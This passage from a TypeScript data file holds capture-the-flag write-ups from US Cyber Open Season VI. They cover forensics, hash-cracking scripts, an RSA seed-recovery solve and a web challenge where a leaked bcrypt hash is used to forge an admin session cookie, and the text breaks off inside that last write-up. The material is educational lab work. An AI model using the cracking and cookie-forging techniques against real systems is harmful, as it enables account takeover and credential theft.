export type Challenge = {
  slug: string;
  title: string;
  category: 'web' | 'crypto' | 'pwn' | 'rev' | 'forensics' | 'misc' | 'osint';
  description: string;
  content: string; // HTML content of the write-up
};

export type CTFEvent = {
  slug: string;
  name: string;
  date: string;
  endDate?: string;
  description: string;
  teamName: string;
  placement: string;
  totalTeams: number;
  challenges: Challenge[];
};

// ---------------------------------------------------------------------------
// CTF Events & Challenges
// ---------------------------------------------------------------------------

const ctfEvents: CTFEvent[] = [
  // ── US Cyber Open Season VI ──────────────────────────────────────────
  {
    slug: 'us-cyber-open-season-vi',
    name: 'US Cyber Open Season VI',
    date: 'June 2026',
    description: 'Welcome to the US Cyber Open for Season VI! Currently ongoing event.',
    teamName: 'Kyber Tým',
    placement: 'TBD',
    totalTeams: 0,
    challenges: [
      {
        slug: 'manifest',
        title: 'Manifest',
        category: 'forensics',
        description: 'Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01. Imani Boateng captured a short east-west slice of that pivot.',
        content: `<h2>Manifest — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Lakeshore Threat Lab confirmed an attacker pivoted from FIN-WS-07 to NAS-MARITIME-01, the Wabash Marine NAS that hosts the internal Lakefront Fleet Manager web app on port 8088. Imani Boateng captured a short east-west slice of that pivot. Her capture is attached."
</blockquote>
<p class="lead">We're handed a single pcap, <code>wabash_nas_pivot_2026-04-18.pcap</code>, so naturally, the next step is to open it in Wireshark.</p>

<h3>First Look in Wireshark</h3>
<p>Opening the capture, the first thing you notice is how small it is — only a handful of packets, but one of them is way bigger than the rest. All of the traffic is between <code>10.42.18.42</code> and <code>10.42.7.18</code> on port <code>8088</code>.</p>

<h3>Following the Stream</h3>
<p>Since basically everything interesting lives inside that one oversized packet, the fastest way to read it is to just follow the whole conversation. Right-click the packet → <strong>Follow → TCP Stream</strong>, and Wireshark reassembles it for you (the <strong>Packet Bytes</strong> pane works too if you'd rather look at the raw hex).</p>
<p>What comes back is a chunk of plain HTTP — requests, responses, headers and all.</p>

<h3>Finding the Right Request</h3>
<p>Scrolling through, there are a few <code>GET</code> requests hitting an internal API, but one stands out:</p>
<pre><code>GET /api/v1/personnel/crew_manifests_q2_2026.csv HTTP/1.1</code></pre>
<p>Right after it, the server responds with a <code>200 OK</code> and dumps the raw body of a CSV — a crew manifest.</p>

<h3>Spotting the Flag</h3>
<p>The CSV header row is <code>vessel_id,crew_id,first_name,last_name,rank,billet,start_date,notes</code>. Most of the data in here looks fine, but one row has a long, base64 encoded string sitting where a normal note should be:</p>
<pre><code class="language-csv">WAB-2207,BR9X2E,Jonas,Tolliver,Master,Charter Liaison,2026-02-14,U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==</code></pre>
<p>The next natural step is decoding it. Decoding it with any tool you like reveals the output:</p>
<pre><code class="language-bash">echo "U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==" | base64 -d</code></pre>
<p>Which gives us the flag: <code>SVIUSCG{wabash_finws_pivot_nas_maritime_01}</code></p>`
      },
      {
        slug: 'oakhash',
        title: 'OakHash',
        category: 'forensics',
        description: 'Professor Oak wants to beef up the security of his Pokémon PC and created OakHash. Can you find the correct combo of Pokémon nature and Gen 1 Pokémon to crack his password?',
        content: `<h2>OakHash — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Professor Oak is really wanting to beef up the security of the PC he uses for Pokemon storage and decided to make a program to generate strong passwords for him. The only problem is that he's a little bit predictable with it, and hes just using basic MD5 as a hashing function. His custom hash type OakHash is just: $oak$&lt;version&gt;$&lt;hex digest&gt;. And all his passwords follow the scheme: SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}."
</blockquote>
<p class="lead">The first of the two OakHash CTFs is relatively simple compared to the second and can be solved in under five minutes by writing a simple Python script. We're given a hash in a custom format, which reveals the way Professor Oak hashed his passwords.</p>

<h3>Breaking Down the Format</h3>
<p>The password template is:</p>
<pre><code>SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}</code></pre>
<p>and the hash we need to crack is:</p>
<pre><code>$oak$1$753a7277c956277fc6a3bb8e31822b25</code></pre>
<p>Split on <code>$</code> and you get version <code>1</code> plus a plain old MD5 digest: <code>753a7277c956277fc6a3bb8e31822b25</code>. So "OakHash v1" is basically a fancy MD5.</p>
<p>There are 25 Pokémon natures (<code>hardy</code>, <code>lonely</code>, <code>brave</code>, <code>adamant</code>, and so on) and 151 Generation 1 Pokémon, so the whole search space is:</p>
<p class="font-semibold text-accent text-center my-4 font-mono text-lg">25 × 151 = 3,775 combinations</p>
<p>That's small enough that a Python loop will finish it very quickly.</p>

<h3>The Cracker</h3>
<p>Hash every nature/Pokémon pairing and compare it against the target digest. Lists trimmed here for readability — the real script has all 25 natures and all 151 Pokémon:</p>
<pre><code class="language-python">import hashlib

target_hash = "753a7277c956277fc6a3bb8e31822b25"

pokemon_natures = ["hardy", "lonely", "brave", "adamant", "naughty", ...]
gen_1_pokemon = ["bulbasaur", "ivysaur", "venusaur", "charmander", ..., "mew"]

combinations = [
    f"SVIUSCG{{{nature}_{pokemon}}}" 
    for nature in pokemon_natures 
    for pokemon in gen_1_pokemon
]

def crack_oak_hash():
    for flag_attempt in combinations:
        hashed = hashlib.md5(flag_attempt.encode('utf-8')).hexdigest()
        if hashed == target_hash:
            return f"Flag = {flag_attempt}"
    return "Nothing found"

print(crack_oak_hash())</code></pre>

<h3>Result</h3>
<pre><code class="language-bash">$ python crack.py
Flag = SVIUSCG{adamant_zubat}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{adamant_zubat}</code></pre>`
      },
      {
        slug: 'oakhash-2',
        title: 'OakHash 2',
        category: 'forensics',
        description: 'Professor Oak rolled out OakHash v2 with a custom KDF structure to slow down brute force attempts. To break it, we implement a highly optimized OpenMP-parallelized C cracker that uses low-level SHA-256 block manipulation and layout optimizations to achieve massive hash rates.',
        content: `<h2>OakHash 2 — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"After the abysmall failure of OakHash version 1 and Team Rocket using it to steal several valuable pokemon, Professor Oak decided to roll his own very expensive hash type in order to slow down any sort of brute-force attempts even if the hash gets stolen. The new OakHash version 2 is formatted like:<br/><br/>

$oak$&lt;version&gt;$&lt;salt&gt;$&lt;hex digest&gt;<br/><br/>

And the actual passwords he uses follow this format:<br/><br/>

SVIUSCG{&lt;nature&gt;_&lt;pokemon&gt;_&lt;move&gt;_&lt;crc32hex&gt;} where crc32hex = crc32(\"&lt;nature&gt;_&lt;gen1_pokemon&gt;_&lt;move&gt;\")<br/><br/>

The move selected must be learnable by the pokemon in question (obivously). Then the password goes through A LOT of iterations of hashing to ensure it is as secure as possible. You can see the exact scheme in the attatched python file. On his local machine, he's able to test cracking this sort of thing by using:<br/><br/>

hashcat -m 31337<br/><br/>

Wait, you don't have that mode? Oh well....<br/><br/>

See if you can crack the attached hash file and sieze your trainer destiny!"
</blockquote>
<p class="lead">Professor Oak decided to bulk up his security, and compared to the first OakHash, this one is much trickier. Here, unlike the first one, he's also wrapped it in a custom KDF that runs 65,536 rounds of SHA-256 per guess, which is very annoying because our number of guesses skyrockets.</p>

<h3>1. Working Out the Search Space</h3>
<p>The hash format is <code>$oak$&lt;version&gt;$&lt;salt&gt;$&lt;hex digest&gt;</code>, and the one we're given is:</p>
<pre><code>$oak$2$oak-lab-v3$59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f</code></pre>
<p>Breaking that apart:</p>
  <ul class="list-disc pl-6 space-y-1 mb-4">
    <li><strong>Version:</strong> 2</li>
    <li><strong>Salt:</strong> <code>oak-lab-v3</code></li>
    <li><strong>Target Digest:</strong> <code>59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f</code></li>
  </ul>
<p>and the password format is <code>SVIUSCG{&lt;nature&gt;_&lt;pokemon&gt;_&lt;move&gt;_&lt;crc32hex&gt;}</code>, where <code>crc32hex</code> is the CRC32 of <code>"&lt;nature&gt;_&lt;gen1_pokemon&gt;_&lt;move&gt;"</code>, formatted as 8 lowercase hex digits.</p>
<p>The challenge text also says the move has to actually be learnable by the Pokémon in question. The plan for building our wordlist:</p>
  <ol class="list-decimal pl-6 space-y-1 mb-4">
    <li>List out all 25 natures (<code>quirky</code>, <code>adamant</code>, ...).</li>
    <li>List out all 151 Gen 1 Pokémon (<code>eevee</code>, <code>zubat</code>, ...).</li>
    <li>For each Pokémon, pull its Gen 1 learnset — PokeAPI works fine (that is the API I used, but there are definitely more ways to do it).</li>
    <li>For every (nature, pokemon, move) triple, compute the CRC32 and build the candidate flag string.</li>
  </ol>
<p>That gives us <strong>767,350 candidates</strong> total. That wouldn't be so bad, but we have to remember the iterations, and because of that, our number of guesses goes up to something around 50 billion.</p>

<h3>2. What OakHash v2 Actually Does</h3>
<p>The challenge ships the exact Python reference implementation:</p>
<pre><code class="language-python">def oakhash_v2(password: str, salt: bytes) -> str:
    p = password.encode()
    c = zlib.crc32(p) &amp; 0xFFFFFFFF
    cbytes = c.to_bytes(4, "little")
    x = hashlib.sha256(salt + p).digest()
    for i in range(65536):
        block = bytearray(x)
        for j in range(32):
            block[j] ^= cbytes[(i + j) % 4]
            block[j] = ((block[j] &lt;&lt; 3) | (block[j] &gt;&gt; 5)) &amp; 0xFF
        x = hashlib.sha256(bytes(block) + p + i.to_bytes(2, "little")).digest()
    return x.hex()</code></pre>
<p>Because of the huge amount of guesses we have to make, instead of writing this in Python like Professor Oak did, it's going to be much faster to do it in C.</p>

<h3>3. Making the C Cracker Actually Fast</h3>
<p>Just looping and calling OpenSSL's <code>SHA256()</code> helps, but there's a lot of free performance left on the table. Here's what made the real difference in <code>cracker_optimized.c</code>:</p>

<h4>A. Pre-Building the Padded Buffer</h4>
<p>Normally, SHA-256 padding — the <code>0x80</code> marker, the zero padding, the bit-length suffix — gets recalculated every time you call <code>SHA256_Update</code>. But look closely at the loop: the message length is <em>always</em> the same on every iteration, <code>32 (block) + pass_len + 2 (counter)</code> bytes. Which means the padding never actually moves.</p>
<p>So we build the fully padded buffer once, before the loop even starts:</p>
<pre><code class="language-c">size_t msg_len = 32 + pass_len + 2;
size_t total = ((msg_len + 9 + 63) / 64) * 64; // align to 64-byte block size

uint8_t buf[320];
memset(buf, 0, total);
memcpy(buf + 32, pwd, pass_len); // copy password once
buf[msg_len] = 0x80;             // set padding marker once
uint64_t bitlen = (uint64_t)msg_len * 8;
for (int i = 0; i &lt; 8; i++) buf[total - 1 - i] = (uint8_t)(bitlen &gt;&gt; (8 * i));
</code></pre>
<p>Inside the loop, the only bytes that ever change are the 32-byte rotated block and the 2-byte counter:</p>
<pre><code class="language-c">buf[32 + pass_len]     = (uint8_t)(i &amp; 0xFF);
buf[32 + pass_len + 1] = (uint8_t)(i &gt;&gt; 8);
</code></pre>
<p>From there the buffer goes straight into <code>SHA256_Transform</code>, which just runs the compression function on a ready-made block — no allocations, no padding logic, nothing extra happening per call.</p>

<h4>B. Skipping the Modulo</h4>
<p>Small detail, but <code>(i + j) % 4</code> gets evaluated 32 times per iteration, and integer division isn't free on most CPUs. Since 4 is a power of two, <code>(i + j) &amp; 3</code> does exactly the same thing in a single cycle.</p>

<h4>C. Throwing the Whole CPU At It</h4>
<p>The candidate list gets split across all available cores with OpenMP:</p>
<pre><code class="language-c">#pragma omp parallel for schedule(dynamic, 64)
for (int w = 0; w &lt; idx; w++) {
    if (__atomic_load_n(&amp;found, __ATOMIC_RELAXED)) continue;
    ...
</code></pre>
<p>Work gets handed out in chunks of 64 candidates so faster threads don't sit around waiting. Now that we have optimized the script from hours to a couple of minutes, it's just a matter of running it.</p>

<h3>4. Running It</h3>
<p>Compiled:</p>
<pre><code class="language-bash">gcc -O3 -march=native -fopenmp cracker_optimized.c -o cracker -lssl -lcrypto -lz</code></pre>
<p>Against our 767,350 candidates it cranks along at roughly 1,330 passwords/sec (~87 million SHA-256 transforms per second), and finds the match in about 8 minutes:</p>
<pre><code>[*] Loaded 767350 candidates. Starting OpenMP brute-force...
[*] Progress: 85.36% (655000/767350)  rate=1330.1/s  ETA=84s
[+] FLAG: SVIUSCG{quirky_eevee_tackle_780deef6}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{quirky_eevee_tackle_780deef6}</code></pre>`
      },
      {
        slug: 'coppersmiths-heirs',
        title: "Coppersmith's Heirs",
        category: 'crypto',
        description: `Two heirs received encrypted copies of Coppersmith's will. The lawyer, being old-fashioned, used RSA with e=3 and helpfully added 1 to the second copy "for uniqueness." On one of the documents, there appeared to be a long string of numbers accidentally printed that may have leaked at least a partial key needed to decrypt the documents. Two heirs, two paths to the inheritance.. who will get it first?`,
        content: `<h2>Coppersmith's Heirs — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Two heirs received encrypted copies of Coppersmith's will. The lawyer, being old-fashioned, used RSA with e=3 and helpfully added 1 to the second copy "for uniqueness." On one of the documents, there appeared to be a long string of numbers accidentally printed that may have leaked at least a partial key needed to decrypt the documents. Two heirs, two paths to the inheritance.. who will get it first?"
</blockquote>
<p class="lead">The challenge name and description are pointing pretty hard at some difficult RSA math, but if you look at the script carefully, you will find a super simple and glaring weakness.</p>

<h3>The Attacks We Almost Needed</h3>
<p>Reading the prompt, there are two attacks that seem clearly "intended":</p>
  <ul class="list-disc pl-6 space-y-2 mb-4">
    <li><strong>Franklin-Reiter related message attack:</strong> two ciphertexts (<code>c1</code> and <code>c2</code>) encrypt related plaintexts (<code>m</code> and <code>m + 1</code>) under a small public exponent, <code>e = 3</code> — textbook setup for this attack.</li>
    <li><strong>Coppersmith partial key exposure:</strong> the "leaked string of numbers" reads like the high bits of the private exponent <code>d</code> (<code>d_high</code>), which is exactly what Coppersmith's small-roots theorem and lattice reduction (LLL) are built to exploit.</li>
  </ul>
<p>Both are legitimate, solvable paths here. But at the end of the day, it's just too much work because of this super simple bug.</p>

<h3>The Real Bug: A Hardcoded PRNG Seed</h3>
<p>Digging through the source for how the keys actually get generated, one line gives the whole thing away:</p>
<pre><code class="language-python">rng = random.Random(0x1337)</code></pre>
<p>The RNG used to generate <code>p</code> and <code>q</code> is seeded with a fixed constant. That means key generation is <em>completely deterministic</em> — run this code anywhere, anytime, and you'll get back the exact same <code>p</code> and <code>q</code> every single time.</p>
<p>So instead of touching lattices or Franklin-Reiter at all, we can just regenerate the keypair ourselves from scratch and decrypt directly, and not waste time doing hard math.</p>

<h3>Exploit Script</h3>
<p>Re-seed Python's RNG with <code>0x1337</code>, regenerate the 1024-bit primes the same way the challenge does, rebuild the private key, and decrypt <code>c1</code>:</p>
<pre><code class="language-python">import random
from sympy import nextprime

e = 3
N_given = 2524... 
c1 = 26636... 

rng = random.Random(0x1337)

def gen_prime_1024(rng, e):
    while True:
        p = rng.getrandbits(1024)
        p |= (1 &lt;&lt; 1023)
        p |= 1
        p = nextprime(p)
        if p.bit_length() == 1024 and (p - 1) % e != 0:
            return p

p = gen_prime_1024(rng, e)
q = gen_prime_1024(rng, e)

if p * q == N_given:
    print("got the modulus")
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    m = pow(c1, d, N_given)
    flag = bytes.fromhex(hex(m)[2:])
    print(f"FLAG: {flag.decode()}")
</code></pre>

<h3>Flag Recovery</h3>
<p>Run it, and out comes the flag — no hard math required, just a simple script.</p>
<pre><code class="language-bash">$ python3 solve.py
got the modulus
FLAG: SVIUSCG{c0pp3r5m1th_fr4nkl1n_r3173r_ch41n3d}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{c0pp3r5m1th_fr4nkl1n_r3173r_ch41n3d}</code></pre>`
      },
      {
        slug: 'souvenirs',
        title: 'Souvenirs 🌍',
        category: 'forensics',
        description: 'Every traveler comes home with a bag full of souvenirs. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you\'d think.',
        content: `<h2>Souvenirs 🌍 — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Every traveler comes home with a bag full of souvenirs — some you put on a shelf, some you tuck quietly inside other things so the airport doesn't ask questions. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you'd think."
</blockquote>
<p class="lead">We get one file — <code>souvenirs.jpg</code> — and from the CTF description we can tell there is more under the hood.</p>

<h3>JPEGs That Are Secretly ZIPs Too</h3>
<p>A basic forensics operation is to stick a ZIP (or other compressed file) onto the end of a JPEG. Image viewers read a JPEG from the <code>FF D8</code> Start of Image marker and just stop the moment they hit <code>FF D9</code> (End of Image) — anything appended after that is invisible to them.</p>

<h3>Checking the Theory</h3>
<p>Open <code>souvenirs.jpg</code> in a hex editor and jump to the end of the file. There's the JPEG's <code>FF D9</code> marker at offset <code>0x9aa7</code>, and right after it: <code>50 4b 03 04</code>, the ZIP local file header signature. You can even see readable filenames in there, like <code>postcards/01_tokyo.txt</code>.</p>
<p>If you'd rather stay in a terminal, this gets you the same information:</p>
<pre><code class="language-bash">strings souvenirs.jpg | tail -n 10
hexdump -C souvenirs.jpg | tail -n 20</code></pre>
<p>Either way, you'll spot the <code>postcards/</code> filenames and the ZIP header just sitting there in plain sight.</p>

<h3>Pulling the Archive Out</h3>
<p>Once you know it's a polyglot, extraction is effortless with binwalk, which automatically identifies and extracts embedded files:</p>
<pre><code class="language-bash">binwalk -e souvenirs.jpg</code></pre>
<p>You can also, of course, use other ways to get the files out but this is the easiest one.</p>

<h3>Reading the Postcards</h3>
<p>Unzipping gives us a <code>postcards/</code> folder with four text files:</p>
<ul>
  <li><code>01_tokyo.txt</code> — souvenir code <code>7B7B-NOPE</code></li>
  <li><code>02_marrakech.txt</code> — <code>NOT_HERE_KEEP_LOOKING</code></li>
  <li><code>03_iceland.txt</code> — <code>STILL_NOT_HERE</code></li>
  <li><code>04_oman.txt</code> — this is the one</li>
</ul>
<p><code>04_oman.txt</code> reads:</p>
<pre><code>From: Mutrah Corniche, Muscat
Weather: warm, salt in the air, gentle breeze off the gulf
Mood: at home

Notes:
- Walked the corniche at sunset. The boats in the harbour looked like they were
  floating on liquid gold.
- The frankincense souq smells like every old story you've ever heard.
- Bought: a small khanjar pendant. Heavier than it looks. Carrying it makes me
  stand a little straighter.

The best souvenirs aren't things. They're the ones you can carry quietly,
the ones nobody else can see.

Here is yours:

    SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}

Safe travels, traveler.</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}</code></pre>`
      },
      {
        slug: 'broken-envelope',
        title: 'Broken Envelope',
        category: 'forensics',
        description: 'Blue Mountain Geotechnical\'s files were partially corrupted by ransomware. Fix the corrupted project archive by repairing the ZIP file headers to recover the site dispatch.',
        content: `<h2>Broken Envelope — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Blue Mountain Geotechnical is a Denver-based soils and rock-mechanics consultancy. A cryptolocker affiliate passed through the firm's file shares and partly corrupted several project archives before IT lead Bela Srivastava pulled the plug. Project engineer Adalyn Proteau needs the site dispatch read before Monday's client meeting."
</blockquote>
<p class="lead">We're given a ZIP archive that is corrupted, and we need to get the flag out of it.</p>

<h3>How a ZIP File Is Actually Structured</h3>
<p>A ZIP archive is made of three main pieces:</p>
<ol>
  <li><strong>Local File Headers (LFH)</strong> — one per archived file, starting with <code>50 4B 03 04</code>, containing that file's metadata and compressed bytes.</li>
  <li><strong>Central Directory</strong> — a list of Central Directory File Headers (CDFH, magic <code>50 4B 01 02</code>) near the end, one per file.</li>
  <li><strong>End of Central Directory (EOCD)</strong> — a fixed 22-byte record (magic <code>50 4B 05 06</code>) telling readers where the Central Directory lives and how big it is.</li>
</ol>

<p>Walking through the hex we were given, things look mostly fine at first:</p>
<ul>
  <li><code>0x000</code>: LFH for <code>project_dispatch.txt</code></li>
  <li><code>0x0B3</code> (179): LFH for <code>readme.txt</code></li>
  <li><code>0x114</code> (276): CDFH for <code>project_dispatch.txt</code> (66 bytes)</li>
  <li><code>0x156</code> (342): CDFH for <code>readme.txt</code> (56 bytes)</li>
</ul>
<p>...and then nothing. Just zero bytes past the second CDFH. The EOCD record — the thing every ZIP reader needs in order to even <em>find</em> the Central Directory — is completely missing. That's our corruption.</p>

<h3>Rebuilding the EOCD by Hand</h3>
<p>The good news is the EOCD is small, fixed-size, and every field can be worked out from what we already know about the archive. All fields are little-endian:</p>
<pre><code>Signature: 50 4B 05 06
Disk Number: 00 00
CD Disk Number: 00 00
Disk CD Entries: 02 00
Total CD Entries: 02 00
Size of CD: 7A 00 00 00 (122 bytes)
Offset of CD: 14 01 00 00 (276 bytes)
Comment Length: 00 00</code></pre>

<p>Which gives us the following bytes to tack on at the end of the file:</p>
<pre><code>50 4B 05 06 00 00 00 00 02 00 02 00 7A 00 00 00 14 01 00 00 00 00</code></pre>

<h3>Patching It Up in Python</h3>
<p>Take the corrupted byte array we were given, glue our hand-built EOCD onto the end, write it out as a ZIP, and try extracting it:</p>
<pre><code class="language-python">import zipfile

arr = bytes([
    0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x05, 0x57,
    0xB1, 0x5C, 0x5F, 0x7D, 0x72, 0xB3, 0x81, 0x00, 0x00, 0x00, 0x88, 0x00,
    # ... (hex) ...
    0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0xB3, 0x00, 0x00, 0x00, 0x72, 0x65,
    0x61, 0x64, 0x6D, 0x65, 0x2E, 0x74, 0x78, 0x74
])

eocd = bytes([
    0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x02, 0x00, 0x7A, 0x00, 0x00, 0x00,
    0x14, 0x01, 0x00, 0x00, 0x00, 0x00
])

repaired_data = arr + eocd
with open("repaired.zip", "wb") as f:
    f.write(repaired_data)

with zipfile.ZipFile("repaired.zip", "r") as z:
    for name in z.namelist():
        print(f"Content of {name}:")
        print(z.read(name).decode("utf-8"))</code></pre>

<h3>Getting to the Flag</h3>
<p>That successfully extracts both <code>readme.txt</code> and <code>project_dispatch.txt</code>. The dispatch file is the one we care about:</p>
<pre><code>Blue Mountain Geotechnical - project dispatch
tag: U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=
site: Sawatch Ridge borehole 17</code></pre>
<p>The <code>tag</code> field is base64 — decode it:</p>
<pre><code class="language-bash">$ echo "U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=" | base64 -d
SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>`
      },
      {
        slug: 'historical-breadcrumbs',
        title: 'Historical Breadcrumbs',
        category: 'forensics',
        description: 'Portfolio manager Piper Landau is suspected of leaking end-of-day positions. Perform host forensics on her Windows profile extract to locate the exfiltration channel.',
        content: `<h2>Historical Breadcrumbs — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"Osprey Capital Management is a Stamford-based boutique hedge fund. Chief compliance officer Camila Orantes suspects that portfolio manager Piper Landau leaked end-of-day positions to an external channel on 2026-07-18. Camila engaged forensic analyst Augustin Vogel at Resilient Peak Forensics, who imaged Piper's workstation and extracted her user profile."
</blockquote>
<p class="lead">We've got a Windows user profile extract and a specific date to focus on. Basically: figure out what Piper actually did on 2026-07-18, and where the data ended up going.</p>

<h3>Where to Start Looking</h3>
<p>There's a fairly standard set of places worth checking first:</p>
<ol>
  <li><strong>Shell history</strong> — <code>ConsoleHost_history.txt</code> for any PowerShell commands she ran.</li>
  <li><strong>Browser history</strong> — Chrome's <code>History</code> SQLite database, looking for uploads or paste sites.</li>
  <li><strong>Activity timeline</strong> — <code>ActivitiesCache.db</code> and <code>wpndatabase.db</code> for background activity and notifications.</li>
</ol>

<h3>PowerShell History</h3>
<p>The history file at <code>AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> shows the following commands:</p>
<pre><code class="language-bash">net use \\\\OSPREY-FS01\\Finance$ /user:OSPREY\\plandau
Copy-Item ".\\Documents\\Q4_2026_EOD_Positions.xlsx" "\\\\OSPREY-FS01\\Finance$\\Reports\\2026\\"
Set-Location "C:\\Users\\plandau\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
Get-ChildItem | Format-Table Name, Length, LastWriteTime</code></pre>
<p>So Piper definitely accessed and copied <code>Q4_2026_EOD_Positions.xlsx</code> onto a finance share — but there's nothing here that looks like an actual upload off the network. No curl, no FTP. What is interesting, though, is the very next thing she did: <code>cd</code>'d straight into her Chrome profile folder and listed its contents. That feels like a pretty deliberate hint about where to look next.</p>

<h3>Digging Through Chrome History</h3>
<p>Chrome keeps browsing history in a SQLite database at <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\History</code>. Connect to it and pull the most recently visited URLs:</p>
<pre><code class="language-python">import sqlite3

conn = sqlite3.connect("History")
cursor = conn.cursor()
cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10;")
for row in cursor.fetchall():
    print(row)</code></pre>

<p>Most of the top results are exactly what you'd expect from a portfolio manager — Bloomberg, the company intranet, SEC EDGAR. But one entry doesn't belong: a visit to a paste-upload site at <strong>2026-07-19 04:47:11 UTC</strong>, which lines up with the suspected leak window on 2026-07-18:</p>
<pre><code>https://paste-mirror-q4.example.invalid/upload?tag=U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9&src=oc</code></pre>

<h3>Decoding the Flag</h3>
<p>The <code>tag</code> query parameter on that URL is base64. Decoding it:</p>
<pre><code class="language-bash">$ echo "U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9" | base64 -d
SVIUSCG{osprey_chrome_history_leak_url}</code></pre>

<h3>Flag</h3>
<pre><code>SVIUSCG{osprey_chrome_history_leak_url}</code></pre>`
      },
      {
        slug: 'intern-net',
        title: 'Intern-Net',
        category: 'web',
        description: "MegaCorp's interns created a custom announcement board. Analyze their login script to exploit client-side password verification and hijack the administrator session.",
        content: `<h2>Intern-Net — US Cyber Open Season VI</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
"The interns at MegaCorp noticed the need for a good way to connect with their peers and took it upon themselves to set up a new announcement board. Of course it somehow completely missed the normal infosec review before going to prod but they swear it's totally secure. Can you help us double check?"
</blockquote>
<p class="lead">"Totally secure," apparently. Let's take a look at how the login actually works and see how that claim holds up.</p>

<h3>What the Login Script Actually Does</h3>
<p>Pulling up the frontend JS for the login form, here's the part that matters:</p>
<pre><code class="language-javascript">form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    clearError();

    if (!username || !password) {
        showError('Please enter your username and password.');
        return;
    }

    setLoading(true);

    try {
        const hashRes = await fetch('/api/auth/hash', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username }),
        });

        if (!hashRes.ok) throw new Error('Invalid username or password.');
        const { hash } = await hashRes.json();

        const isValid = await bcrypt.compare(password, hash);
        if (!isValid) throw new Error('Invalid username or password.');

        const token = btoa(hash);
        document.cookie = \`auth_token=\${token}; path=/; SameSite=Lax\`;
        window.location.href = '/announcements';

    } catch (err) {
        showError(err.message || 'Authentication failed. Please try again.');
        setLoading(false);
    }
});</code></pre>

<p>There isn't just one bug here — there are three, stacked on top of each other:</p>
<ol>
  <li><strong>The hash endpoint just hands out hashes.</strong> <code>/api/auth/hash</code> returns a user's bcrypt hash before any password has been checked at all. Anyone can ask for anyone's hash.</li>
  <li><strong>Password verification happens entirely in the browser.</strong> <code>bcrypt.compare(password, hash)</code> runs client-side, so there's nothing stopping us from skipping it altogether.</li>
  <li><strong>The session token is just the hash, base64'd.</strong> Since we can pull any user's hash from step 1, and the token is literally <code>btoa(hash)</code>, we can mint a valid session for any account we want.</li>
</ol>

<h3>Putting the Pieces Together</h3>

<h4>Step 1 — Figure Out the Admin's Username</h4>
<p>The public side of the announcement board mentions a Senior Intern coordinator named Alex Rivera. Going by the obvious corporate convention, that's probably <code>alex.rivera</code>.</p>

<h4>Step 2 — Grab Their Hash</h4>
<p>Just ask the API — it doesn't check anything before answering:</p>
<pre><code class="language-bash">$ curl -X POST https://intern-net.uscg/api/auth/hash \\
  -H "Content-Type: application/json" \\
  -d '{"username": "alex.rivera"}'

{"hash":"$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ..."}</code></pre>

<h4>Step 3 — Forge the Session Cookie</h4>
<p>Since the session cookie is nothing more than <code>btoa(hash)</code>, we can build it ourselves right in the dev console:</p>
<pre><code class="language-javascript">// Base64-encode the harvested bcrypt hash
const adminHash = "$2b$10$P2N5nB9xO9876543210abcdEFGHIJKLMNOPQRSTUVWXYZ...";
const forgedToken = btoa(adminHash);

// Set the auth_token cookie
document.cookie = \`auth_token=\${forgedToken}; path=/; SameSite=Lax\`;</code></pre>

<p>Set that cookie, navigate to <code>/announcements</code>, and the server treats us as <code>alex.rivera</code> — no password ever entered.</p>

<h3>Flag Recovery</h3>
<p>With access to the restricted board, we find the coordinator's post:</p>
